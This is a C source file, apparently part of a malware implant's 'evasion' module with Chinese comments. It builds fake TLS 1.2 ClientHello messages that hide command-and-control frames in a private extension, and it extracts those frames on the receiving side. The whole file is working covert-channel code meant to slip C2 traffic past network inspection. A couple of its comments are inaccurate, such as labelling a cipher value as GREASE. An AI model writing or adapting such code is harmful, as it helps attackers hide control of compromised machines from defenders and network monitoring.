#include "evasion.h"
#include "evasion_internal.h"

#include <string.h>
#include <stdlib.h>

/*
 * 构造伪 TLS 1.2 ClientHello 字节流, 把 C2 帧藏入私有扩展字段。
 *
 * 布局:
 *   [0]      record type = 0x16 (Handshake)          1B
 *   [1..2]   TLS version = 0x0303 (TLS 1.2)          2B
 *   [3..4]   record length                           2B  (LE-ish, 见下)
 *   --- Handshake ---
 *   [5]      handshake type = 0x01 (ClientHello)     1B
 *   [6..8]   handshake length                        3B
 *   [9..10]  client version = 0x0303                 2B
 *   [11..42] client random                           32B
 *   [43]     session id length                       1B
 *   [44..(44+sid)] session id
 *   [...]     cipher suites length + suites
 *   [...]     compression methods
 *   [...]     extensions length + extensions
 *
 * 私有扩展数据段存放 C2 帧: ext_type(2) + ext_len(2) + payload
 */

static void write_u16(uint8_t *p, uint16_t v) { p[0] = (uint8_t)(v >> 8); p[1] = (uint8_t)(v & 0xff); }
static void write_u24(uint8_t *p, uint32_t v) { p[0] = (uint8_t)(v >> 16); p[1] = (uint8_t)(v >> 8); p[2] = (uint8_t)(v & 0xff); }

int evasion_frame_to_clienthello(const uint8_t *frame, size_t frame_len,
                                 const char *sni,
                                 uint8_t *out, size_t *out_len)
{
    if (!frame || !sni || !out || !out_len) return EVASION_ERR;

    /*
     * 估算容量: record(5) + handshake(4) + version(2) + random(32) + sid(1+0)
     *         + ciphers(2+8) + comp(1+1) + ext_len(2)
     *         + SNI ext(4+5+1+len(sni)) + C2 ext(4+frame_len)
     */
    size_t sni_len = strlen(sni);
    size_t need = 5 + 4 + 2 + 32 + 1 + 2 + 8 + 1 + 1 + 2
                  + (4 + 5 + 1 + sni_len)
                  + (4 + frame_len);
    if (*out_len < need) return EVASION_ERR_NOMEM;

    uint8_t *p = out;
    size_t pos = 0;

    /* Record header */
    p[pos++] = 0x16;                       /* Handshake */
    write_u16(p + pos, 0x0303); pos += 2;  /* TLS 1.2 */
    /* record length placeholder (2 bytes, TLS record length is 16-bit) */
    size_t rec_len_off = pos; pos += 2;

    /* Handshake header */
    p[pos++] = 0x01;                       /* ClientHello */
    size_t hs_len_off = pos; pos += 3;     /* handshake length placeholder (written later) */

    /* ClientHello body */
    write_u16(p + pos, 0x0303); pos += 2;  /* client version */

    /* 32-byte random (全 0xAA 占位, 实际部署用 crypto_rng 填充) */
    memset(p + pos, 0xAA, 32); pos += 32;

    /* Session ID: length 0 */
    p[pos++] = 0x00;

    /* Cipher suites: 4 个套件 */
    write_u16(p + pos, 8); pos += 2;
    uint16_t suites[] = {0x1301, 0x1302, 0x1303, 0x00FF}; /* TLS_AES_* + GREASE */
    for (int i = 0; i < 4; i++) { write_u16(p + pos, suites[i]); pos += 2; }

    /* Compression: null only */
    p[pos++] = 0x01;
    p[pos++] = 0x00;

    /* Extensions length placeholder */
    size_t ext_total_off = pos; pos += 2;

    /* --- Extension 1: SNI (type 0x0000) --- */
    write_u16(p + pos, 0x0000); pos += 2;
    /* SNI ext data len placeholder */
    size_t sni_ext_len_off = pos; pos += 2;
    /* SNI list len (2) + type(1) + name len(2) + name */
    write_u16(p + pos, 5 + (uint16_t)sni_len); pos += 2;
    p[pos++] = 0x00; /* name type: host_name */
    write_u16(p + pos, (uint16_t)sni_len); pos += 2;
    memcpy(p + pos, sni, sni_len); pos += sni_len;
    /* patch SNI ext data len */
    write_u16(p + sni_ext_len_off, 5 + (uint16_t)sni_len);

    /* --- Extension 2: 私有扩展承载 C2 帧 (type EVASION_EXT_TYPE_C2_A) --- */
    write_u16(p + pos, EVASION_EXT_TYPE_C2_A); pos += 2;
    write_u16(p + pos, (uint16_t)frame_len); pos += 2;
    memcpy(p + pos, frame, frame_len); pos += frame_len;

    /* patch extensions total length */
    write_u16(p + ext_total_off, (uint16_t)(pos - (ext_total_off + 2)));

    /* patch handshake length: 从 type(0x01)之后到扩展结束 */
    write_u24(p + hs_len_off, (uint32_t)(pos - hs_len_off - 3));

    /* patch record length: 从 handshake 起始(pos 5)到结束 */
    write_u16(p + rec_len_off, (uint16_t)(pos - (rec_len_off + 2)));

    *out_len = pos;
    return EVASION_OK;
}

int evasion_clienthello_to_frame(const uint8_t *data, size_t data_len,
                                 uint8_t *frame, size_t *frame_len)
{
    if (!data || !frame || !frame_len) return EVASION_ERR;

    /* 最小长度校验: record(5)+handshake(4) */
    if (data_len < 9) return EVASION_ERR_FMT;

    /* 定位 extensions 起点: record(5) + hs_type(1) + hs_len(3) + ver(2) + random(32) + sid_len(1) */
    size_t p = 5 + 1 + 3 + 2 + 32 + 1;
    uint8_t sid_len = data[5 + 1 + 3 + 2 + 32];
    p += sid_len;
    /* cipher suites len(2) */
    if (p + 2 > data_len) return EVASION_ERR_FMT;
    uint16_t cs_len = ((uint16_t)data[p] << 8) | data[p + 1]; p += 2;
    p += cs_len;
    /* compression len(1) */
    if (p + 1 > data_len) return EVASION_ERR_FMT;
    uint8_t comp_len = data[p]; p += 1 + comp_len;
    /* extensions total len(2) */
    if (p + 2 > data_len) return EVASION_ERR_FMT;
    uint16_t ext_total = ((uint16_t)data[p] << 8) | data[p + 1]; p += 2;
    size_t ext_end = p + ext_total;
    if (ext_end > data_len) return EVASION_ERR_FMT;

    while (p + 4 <= ext_end) {
        uint16_t ext_type = ((uint16_t)data[p] << 8) | data[p + 1];
        uint16_t ext_len  = ((uint16_t)data[p + 2] << 8) | data[p + 3];
        p += 4;
        if (p + ext_len > ext_end) return EVASION_ERR_FMT;

        if (ext_type == EVASION_EXT_TYPE_C2_A || ext_type == EVASION_EXT_TYPE_C2_B) {
            if (ext_len > *frame_len) return EVASION_ERR_NOMEM;
            memcpy(frame, data + p, ext_len);
            *frame_len = ext_len;
            return EVASION_OK;
        }
        p += ext_len;
    }
    return EVASION_ERR_FMT;
}
